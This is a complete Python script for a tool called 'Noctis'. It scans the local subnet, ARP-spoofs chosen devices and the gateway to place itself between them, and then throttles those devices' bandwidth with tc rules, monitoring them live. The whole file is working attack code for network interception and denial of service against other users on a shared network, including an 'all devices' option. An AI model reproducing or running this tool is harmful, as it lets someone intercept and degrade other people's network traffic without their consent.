#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import os, sys, json, time, signal, threading, subprocess, logging, atexit, re, socket
from typing import List, Dict, Optional, Tuple
from scapy.all import ARP, Ether, srp, sendp, get_if_addr, conf

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich import box
    RICH = True
except ImportError:
    RICH = False

CONFIG_FILE = os.path.expanduser("~/.noctis_config.json")
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("Noctis")

class Theme:
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"; CYAN = "\033[96m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"

def cprint(text, color="", end="\n"):
    print(f"{color}{text}{Theme.RESET}", end=end)

def tampilkan_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo = r"""
███╗   ██╗ ██████╗  ██████╗████████╗██╗███████╗
████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║██╔════╝
██╔██╗ ██║██║   ██║██║        ██║   ██║███████╗
██║╚██╗██║██║   ██║██║        ██║   ██║╚════██║
██║ ╚████║╚██████╔╝╚██████╗   ██║   ██║███████║
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝   ╚═╝╚══════╝
"""
    print(f"{Theme.RED}{Theme.BOLD}{logo}{Theme.RESET}")
    print(f"{Theme.YELLOW}  ~ Noctis ~{Theme.RESET}\n")

class NetUtils:
    @staticmethod
    def get_network_info():
        try:
            route = conf.route.route("0.0.0.0")
            if route and len(route) >= 5:
                iface = route[3]; gw = route[2]
                my_ip = get_if_addr(iface)
                subnet = f"{my_ip.rsplit('.', 1)[0]}.0/24"
                return iface, gw, my_ip, subnet
        except: pass
        for entry in conf.route.routes:
            if len(entry) >= 5 and entry[0] == 0 and entry[1] == 0:
                iface = entry[3]; gw = entry[2]
                try: my_ip = get_if_addr(iface)
                except: continue
                subnet = f"{my_ip.rsplit('.', 1)[0]}.0/24"
                return iface, gw, my_ip, subnet
        raise RuntimeError("No default route.")

    @staticmethod
    def scan(iface, subnet, timeout=2):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=timeout, iface=iface, verbose=False)
        devs = []
        for _, r in ans:
            try: host = socket.gethostbyaddr(r.psrc)[0]
            except: host = "?"
            devs.append({"ip": r.psrc, "mac": r.hwsrc, "hostname": host})
        return devs

    @staticmethod
    def get_mac(ip, iface):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, iface=iface, verbose=False)
        return ans[0][1].hwsrc if ans else None

    @staticmethod
    def set_ip_forward(on=True):
        val = "1" if on else "0"
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

class ARPSpoofer:
    def __init__(self, iface, gw_ip):
        self.iface = iface; self.gw = gw_ip
        self.stop_ev = threading.Event(); self.threads = []

    def _spoof(self, t_ip):
        t_mac = NetUtils.get_mac(t_ip, self.iface)
        g_mac = NetUtils.get_mac(self.gw, self.iface)
        if not t_mac or not g_mac: return
        pkt1 = Ether(dst=t_mac)/ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.gw)
        pkt2 = Ether(dst=g_mac)/ARP(op=2, pdst=self.gw, hwdst=g_mac, psrc=t_ip)
        while not self.stop_ev.is_set():
            sendp(pkt1, iface=self.iface, verbose=False)
            sendp(pkt2, iface=self.iface, verbose=False)
            time.sleep(2)

    def start(self, targets):
        for ip in targets:
            t = threading.Thread(target=self._spoof, args=(ip,))
            t.daemon = True; t.start(); self.threads.append(t)

    def restore(self, t_ip):
        t_mac = NetUtils.get_mac(t_ip, self.iface)
        g_mac = NetUtils.get_mac(self.gw, self.iface)
        if t_mac and g_mac:
            pkt1 = Ether(dst=t_mac)/ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.gw, hwsrc=g_mac)
            pkt2 = Ether(dst=g_mac)/ARP(op=2, pdst=self.gw, hwdst=g_mac, psrc=t_ip, hwsrc=t_mac)
            for _ in range(5):
                sendp(pkt1, iface=self.iface, verbose=False)
                sendp(pkt2, iface=self.iface, verbose=False)

    def stop(self):
        self.stop_ev.set()
        for t in self.threads:
            if t.is_alive(): t.join(timeout=2)

class TrafficShaper:
    def __init__(self, iface):
        self.iface = iface; self.classes = {}; self.next_id = 10

    def setup(self):
        self.cleanup()
        subprocess.run(["tc", "qdisc", "add", "dev", self.iface, "root", "handle", "1:", "htb", "default", "1"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["tc", "class", "add", "dev", self.iface, "parent", "1:", "classid", "1:1", "htb", "rate", "1000mbit"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def add_target(self, ip, rate_str):
        cid = f"1:{self.next_id}"
        rate = self._parse(rate_str)
        subprocess.run(["tc", "class", "add", "dev", self.iface, "parent", "1:1", "classid", cid,
                        "htb", "rate", rate, "ceil", rate, "burst", "1600"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for d in ["src", "dst"]:
            subprocess.run(["tc", "filter", "add", "dev", self.iface, "protocol", "ip", "parent", "1:",
                            "prio", "1", "u32", "match", "ip", d, ip, "flowid", cid],
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.classes[ip] = cid; self.next_id += 1

    def _parse(self, s):
        m = re.match(r"(\d+(?:\.\d+)?)\s*(kbps|mbps|gbps)?", s.lower().strip())
        if not m: raise ValueError
        num, unit = m.groups()
        if unit: return f"{num}{unit.replace('bps','bit')}"
        return f"{num}kbit"

    def stats(self):
        res = {}
        for ip, cid in self.classes.items():
            try:
                out = subprocess.check_output(["tc", "-s", "class", "show", "dev", self.iface, "classid", cid],
                                              text=True, stderr=subprocess.DEVNULL)
                b = re.search(r"Sent (\d+) bytes", out)
                d = re.search(r"dropped (\d+)", out)
                res[ip] = {"bytes": int(b.group(1)) if b else 0, "dropped": int(d.group(1)) if d else 0}
            except: res[ip] = {"bytes":0, "dropped":0}
        return res

    def cleanup(self):
        subprocess.run(["tc", "qdisc", "del", "dev", self.iface, "root"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        self.classes.clear()

def flush_conntrack(ip):
    try:
        subprocess.run(["conntrack", "-D", "-s", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["conntrack", "-D", "-d", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log.info(f"Flushed connections for {ip}")
    except: pass

class UI:
    def __init__(self, iface, gw, myip, subnet):
        self.iface = iface; self.gw = gw; self.myip = myip; self.subnet = subnet
        self.rich_console = Console() if RICH else None

    def show_network_info(self):
        if RICH:
            self.rich_console.print(f"[dim]Interface: {self.iface} | Gateway: {self.gw} | Your IP: {self.myip}[/]\n")
        else:
            cprint(f"Interface: {self.iface} | Gateway: {self.gw} | Your IP: {self.myip}", Theme.DIM)

    def list_devices(self, devices):
        if RICH:
            self.rich_console.print("[bold]Devices found:[/]")
            for i, d in enumerate(devices):
                tag = ""
                if d['ip'] == self.gw: tag = "[red][ROUTER][/]"
                elif d['ip'] == self.myip: tag = "[yellow][YOU][/]"
                self.rich_console.print(f"  {i+1}. {d['ip']:<15} {d['mac']:<18} {d.get('hostname','?')} {tag}")
        else:
            cprint("Devices found:", Theme.BOLD)
            for i, d in enumerate(devices):
                tag = ""
                if d['ip'] == self.gw: tag = "[ROUTER]"
                elif d['ip'] == self.myip: tag = "[YOU]"
                print(f"  {i+1}. {d['ip']:<15} {d['mac']:<18} {d.get('hostname','?')} {tag}")

    def select_targets(self, devices):
        if not devices: cprint("No devices.", Theme.RED); sys.exit(1)
        self.list_devices(devices)
        while True:
            if RICH: self.rich_console.print("[bold]Select target (number/all): [/]", end="")
            else: cprint("Select target (number/all): ", Theme.BOLD, end="")
            inp = input().strip().lower()
            if inp == "all":
                picked = [d for d in devices if d['ip'] not in (self.gw, self.myip)]
                if not picked:
                    cprint("All devices are either router or yourself.", Theme.RED)
                    continue
                cprint(f"Smart All: {len(picked)} target(s) selected (excluding router & you).", Theme.GREEN)
                return picked
            parts = [int(x)-1 for x in inp.replace(',',' ').split() if x.isdigit()]
            if not parts: cprint("Invalid.", Theme.RED); continue
            picked = [devices[i] for i in parts if 0 <= i < len(devices)]
            if any(d['ip'] in (self.gw, self.myip) for d in picked):
                cprint("Warning: router/yourself included.", Theme.RED)
                if input("Proceed? (y/N): ").lower() != 'y': continue
            return picked

    def set_limits(self, targets):
        cprint("\nSet bandwidth limit for each target:", Theme.BOLD)
        for t in targets:
            while True:
                r = input(f"  {t['ip']} ({t.get('hostname','?')}): ").strip() or "1mbps"
                if re.match(r"^\d+(\.\d+)?\s*(kbps|mbps|gbps)?$", r.lower().replace(" ","")):
                    t['rate'] = r
                    break
                cprint("Invalid format.", Theme.RED)

    def review(self, targets):
        cprint("\nSummary:", Theme.BOLD)
        for t in targets:
            cprint(f"  {t['ip']} -> {t.get('rate')}", Theme.YELLOW)
        input("Press Enter to start...")

    def verify_spoofing(self, targets, timeout=6):
        log.info("Verifying spoofing...")
        start = time.time()
        while time.time()-start < timeout:
            for t in targets:
                try:
                    ret = subprocess.run(["ping","-c","1","-W","1","-I",self.iface,t['ip']],
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                    if ret.returncode == 0: return True
                except: pass
                time.sleep(0.3)
        return False

    def live_monitor(self, targets, shaper, stop_event):
        if RICH:
            console = Console()
            with Live(console=console, refresh_per_second=4, screen=False) as live:
                while not stop_event.is_set():
                    table = Table(title="Noctis v2 – Live Monitor", box=box.HEAVY_EDGE, header_style="bold cyan")
                    table.add_column("IP", width=16)
                    table.add_column("Limit", width=10)
                    table.add_column("Traffic (bytes)", width=15)
                    table.add_column("Dropped", width=10)
                    table.add_column("Status", width=10)

                    stats = shaper.stats()
                    for t in targets:
                        ip = t['ip']
                        s = stats.get(ip, {"bytes":0, "dropped":0})
                        b = s.get("bytes", 0)
                        d = s.get("dropped", 0)
                        alive = True
                        try:
                            subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                        except: alive = False
                        status = "[green]online[/]" if alive else "[red]offline[/]"
                        table.add_row(ip, t.get('rate','?'), f"{b:,}", f"[red]{d:,}[/]" if d else "0", status)
                    table.caption = "[Ctrl+C] to stop and restore network"
                    live.update(table)
                    time.sleep(2)
        else:
            while not stop_event.is_set():
                os.system('clear' if os.name == 'posix' else 'cls')
                cprint("=== NOCTIS – Live Monitor ===", Theme.BOLD)
                cprint(f"{'IP':<16} {'Limit':<10} {'Traffic (bytes)':<15} {'Dropped':<10} {'Status':<10}", Theme.CYAN)
                print("-" * 65)
                stats = shaper.stats()
                for t in targets:
                    ip = t['ip']
                    s = stats.get(ip, {"bytes":0, "dropped":0})
                    b = s.get("bytes", 0)
                    d = s.get("dropped", 0)
                    alive = True
                    try:
                        subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                    except: alive = False
                    status = "online" if alive else "offline"
                    cprint(f"{ip:<16} {t.get('rate','?'):<10} {b:<15,} {d:<10} {status}",
                           Theme.GREEN if alive else Theme.RED)
                cprint("\n[Ctrl+C] to stop and restore network", Theme.DIM)
                time.sleep(2)


def main():
    if os.geteuid() != 0:
        cprint("Run with sudo!", Theme.RED); sys.exit(1)

    tampilkan_banner()
    try:
        iface, gw, myip, subnet = NetUtils.get_network_info()
    except Exception as e:
        cprint(f"Network error: {e}", Theme.RED); sys.exit(1)

    ui = UI(iface, gw, myip, subnet)
    ui.show_network_info()

    devices = NetUtils.scan(iface, subnet)
    if not devices:
        cprint("No devices found.", Theme.RED); sys.exit(1)

    targets = ui.select_targets(devices)
    ui.set_limits(targets)
    ui.review(targets)

    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump({"interface": iface, "gateway": gw, "targets": targets, "timestamp": time.time()}, f)
    except: pass

    NetUtils.set_ip_forward(True)
    shaper = TrafficShaper(iface)
    shaper.setup()
    for t in targets:
        shaper.add_target(t['ip'], t['rate'])

    spoofer = ARPSpoofer(iface, gw)
    spoofer.start([t['ip'] for t in targets])
    time.sleep(2)

    if not ui.verify_spoofing(targets):
        cprint("\nSpoofing failed! Restoring network.", Theme.RED)
        spoofer.stop()
        for t in targets: spoofer.restore(t['ip'])
        shaper.cleanup()
        NetUtils.set_ip_forward(False)
        sys.exit(1)

    for t in targets: flush_conntrack(t['ip'])

    stop_event = threading.Event()
    signal.signal(signal.SIGINT, lambda s,f: stop_event.set())
    signal.signal(signal.SIGTERM, lambda s,f: stop_event.set())

    cprint("\n>>> All targets are being throttled. Live monitor starting...\n", Theme.GREEN)
    time.sleep(0.5)

    monitor_thread = threading.Thread(target=ui.live_monitor, args=(targets, shaper, stop_event))
    monitor_thread.daemon = True
    monitor_thread.start()

    try:
        while not stop_event.is_set():
            stop_event.wait(1)
    except KeyboardInterrupt:
        stop_event.set()

    spoofer.stop()
    for t in targets: spoofer.restore(t['ip'])
    shaper.cleanup()
    NetUtils.set_ip_forward(False)
    log.info("Session ended.")

if __name__ == "__main__":
    main()